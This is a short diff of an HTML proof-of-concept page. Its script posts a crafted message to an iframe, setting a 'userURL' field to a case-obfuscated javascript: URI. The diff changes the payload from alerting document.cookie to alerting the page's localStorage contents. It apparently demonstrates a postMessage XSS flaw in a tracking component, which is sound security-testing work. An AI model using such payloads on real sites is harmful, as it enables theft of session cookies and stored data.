@@ -20,7 +20,7 @@
     <script>
         document.getElementById('sendMessageBtn').onclick = function() {
             const iframe = document.getElementById('myIframe');
-            iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:alert(document.cookie)"}},"*")
+            iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:alert(JSON.stringify(localStorage))"}},"*")
         };
     </script>
 </body>
